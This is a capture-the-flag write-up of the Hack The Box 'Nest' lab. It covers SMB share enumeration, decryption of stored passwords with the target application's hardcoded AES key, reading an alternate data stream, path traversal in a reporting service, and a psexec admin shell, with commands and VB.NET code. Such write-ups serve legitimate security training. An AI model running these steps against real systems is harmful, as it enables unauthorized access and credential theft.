---
title: "Nest — Hack The Box [Write-up]"
author: 0x3ashry
description: "Writeup for Nest Hackthebox Machine"
date: 2022-05-25 16:00:00 +0200
categories: [HackTheBox]
tags: [HTB, Windows]
pin: true
---

![](/img/HTB/Nest/Nest.png)

Nest is one of the most challenging easy machines on HTB including a lot of new aspects as cryptography, de-compiling .Net application and extensive work with SMB shares.
So let's get started...

#### Used Tools:
- nmap
- smbmap
- smbclient
- mount
- telnet
- psexec.py


## 1. SCANNING & ENUMERATION

I will start with nmap and the -A parameter to enable OS detection, version detection, script scanning, and traceroute and append the output to tee command which save the in a file named “nmap” and also show the output on the screen.

![](/img/HTB/Nest/img (1).png)

We found 2 opened ports:
- 445 for SMB
- 4386 Unkown service

Of course let's start with the smb and try mapping its shares

```bash
smbmap -H 10.10.10.178 -u Anonymous
```

![](/img/HTB/Nest/img (2).png)

Found 2 shares with **read access only**:
- Data
- Users

Let's start with `Data` and connect to it using `smbclient`

```bash
smbclient -U "" //10.10.10.178/Data
```

After some directory traversing I found a file under `\Shared\Templates\HR` called "Welcome Email.txt" which looks interesting...

![](/img/HTB/Nest/img (3).png)

After downloading it, found that it was a welcome email sent from HR to a new user called `TempUser` with username and password.

![](/img/HTB/Nest/img (4).png)

Let's connect again with the new creds...

```bash
smbclient -U "TempUser" --password welcome2019 //10.10.10.178/Data
```

I found that now I have access to the `IT` directory

![](/img/HTB/Nest/img (5).png)

But it has a lot of files so let's mount it and have a local copy of it, it would be easier 

```bash
smbclient -U "TempUser" --password welcome2019 //10.10.10.178/Data
```

![](/img/HTB/Nest/img (6).png)

After some directory traversing I found 2 very important files:
- `RU_config.xml` --> //10.10.10.179/Data/IT/Configs/RU Scanner/RU_config.xml
- `config.xml` --> //10.10.10.179/Data/IT/Configs/NotepadPlusPlus/config.xml

**RU_config contain Username `C.smith` and encrypted password** 

![](/img/HTB/Nest/img (7).png)

But it is encrypted so we had to continue...

**config.xml contains a special path in a share called `Secure$`**

![](/img/HTB/Nest/img (8).png)

I tried smbmap again with the new creds and found that we have access to Secure$, So let's connect to it...

```bash
smbclient -U "TempUser" --password welcome2019 //10.10.10.178/Secure$
```

I couldn't list the contents of IT but navigating to /IT/Carl found a lot of files 

![](/img/HTB/Nest/img (9).png)

Mounting Secure$...

```bash
sudo umount /mnt/nest; sudo mount -o user=TempUser -t cifs //10.10.10.178/Secure$ /mnt/nest/
cd /mnt/nest/
cd IT/Carl
find .
```

![](/img/HTB/Nest/img (10).png)

Found file called `Module1.vb` at and it loads `RU_Config.xml` and calles a function called `DecryptString` from a library called `Utils` which is interesting...

![](/img/HTB/Nest/img (11).png)

I found also a file called `Utils.vb` which i think is the called library

It is a library that have 4 functions, 2 for password encoding and other 2 for password decoding

`DecryptString` function which was called previously calls `Decrypt` function which is an AES Encryption cypher with predefined values for the passphrase, salt, number of iterations, initvector and key size in the DecryptString function

```vbnet
    Public Shared Function DecryptString(EncryptedString As String) As String
        If String.IsNullOrEmpty(EncryptedString) Then
            Return String.Empty
        Else
            Return Decrypt(EncryptedString, "N3st22", "88552299", 2, "464R5DFA5DL6LE28", 256)
        End If
    End Function
```

```vbnet
    Public Shared Function Decrypt(ByVal cipherText As String, _
                                   ByVal passPhrase As String, _
                                   ByVal saltValue As String, _
                                    ByVal passwordIterations As Integer, _
                                   ByVal initVector As String, _
                                   ByVal keySize As Integer) _
                           As String

        Dim initVectorBytes As Byte()
        initVectorBytes = Encoding.ASCII.GetBytes(initVector)

        Dim saltValueBytes As Byte()
        saltValueBytes = Encoding.ASCII.GetBytes(saltValue)

        Dim cipherTextBytes As Byte()
        cipherTextBytes = Convert.FromBase64String(cipherText)

        Dim password As New Rfc2898DeriveBytes(passPhrase, _
                                           saltValueBytes, _
                                           passwordIterations)

        Dim keyBytes As Byte()
        keyBytes = password.GetBytes(CInt(keySize / 8))

        Dim symmetricKey As New AesCryptoServiceProvider
        symmetricKey.Mode = CipherMode.CBC

        Dim decryptor As ICryptoTransform
        decryptor = symmetricKey.CreateDecryptor(keyBytes, initVectorBytes)

        Dim memoryStream As IO.MemoryStream
        memoryStream = New IO.MemoryStream(cipherTextBytes)

        Dim cryptoStream As CryptoStream
        cryptoStream = New CryptoStream(memoryStream, _
                                        decryptor, _
                                        CryptoStreamMode.Read)

        Dim plainTextBytes As Byte()
        ReDim plainTextBytes(cipherTextBytes.Length)

        Dim decryptedByteCount As Integer
        decryptedByteCount = cryptoStream.Read(plainTextBytes, _
                                               0, _
                                               plainTextBytes.Length)

        memoryStream.Close()
        cryptoStream.Close()

        Dim plainText As String
        plainText = Encoding.ASCII.GetString(plainTextBytes, _
                                            0, _
                                            decryptedByteCount)

        Return plainText
    End Function
```

All we have to do is to re run the code but replacing the `EncryptedString` parameter in DecryptString with our password hash we found for `C.smith`...

I will use online VB compiler from codingrooms.com and add the previous 2 function in addition to this submain function to call them:

```vbnet
Sub Main()
    Dim password as String
    password = DecryptString("fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=")
    Console.WriteLine(password)

End Sub
```

You'll find the code here: `https://pastebin.com/1SAnwkSb`

We successfully decrypted the hash: `xRxRxPANCAK3SxRxRx`

![](/img/HTB/Nest/img (12).png)

Now let's access the Users share with the C.smith creds

![](/img/HTB/Nest/img (13).png)

BOOOOOOOOM ! We got the user flag.


## 3. PRIVILEGE ESCALATION:

Along with the user flag, we find a folder `HQK Reporting` that contains an executable file called `HqkLdap.exe` in a subfolder called `AD Integration Module`. We get as well a *strange* empty file called `Debug Mode Password.txt`:

So let's mount the share and see it

```bash
sudo umount /mnt/nest; sudo mount -o user=C.smith -t cifs //10.10.10.178/Users /mnt/nest/
cd "/mnt/nest/C.smith/HQK Reporting"
```

Seems like the service running on port `4386` is called `HQK Reporting`.

![](/img/HTB/Nest/img (14).png)

Connect to it using telnet 

```bash
telnet 10.10.10.178 4386
```

![](/img/HTB/Nest/img (15).png)

I didn't reach anything through the application...

I stucked a lot but then found this thread talking about Sth called Alternate Data streams (ADS) over SMB
LINK: `https://superuser.com/questions/1520250/read-alternate-data-streams-over-smb-with-linux`

```bash
smbclient -U C.Smith \\\\10.10.10.178\\Users -c 'allinfo "C.Smith/HQK Reporting/Debug Mode Password.txt"'
```

Indeed it seems like there is an ADS with 15 bytes of data.

![](/img/HTB/Nest/img (16).png)

Connecting to the SMB client and downloading the Debug Mode Password.txt with the ADS using:

```bash
smbclient -U C.Smith \\\\10.10.10.178\\Users
cd "C.Smith\HQK Reporting\"
get "Debug Mode Password.txt:Password:$DATA"
```

Shows a password that I think it could be used for the DEBUG mode in HQK Reporting...

![](/img/HTB/Nest/img (17).png)

Trying it and it successfully enabled DEBUG mode and we have a new privileges

![](/img/HTB/Nest/img (18).png)

`SHOWQUERY` in combination with `SETDIR` and `LIST` gives us arbitrary file-read.

Using .. for the SETDIR command we can traverse our path and using SHOWQUERY we can read Ldap.conf, which contains the encrypted password for the administrator user.

![](/img/HTB/Nest/img (19).png)

It looks like the old encrypted password for TempUser but I thing the values of the AES Cyphed differ this time so we have to find where the Encryption code is to decode it as previously

Let us download the `HqkLdap.exe` file and **decompile** it to decrypt the administrator password.

I used dotPeek to decode it.

At the CR Class in the HqkLdap I found the encryption and decryption functions

![](/img/HTB/Nest/img (20).png)

Repeating the previous decryption steps with changing the values of DecryptString function I managed to get the Administrator password

![](/img/HTB/Nest/img (21).png)

Now that we have the Administrator password , we can use `psexec.py` to get a shell as admin

![](/img/HTB/Nest/img (22).png)

BOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOM !!!! Now we are root :D

Thank you so much for reading and I hope you learned a lot as I did ❤

#### ***0x3ashry***
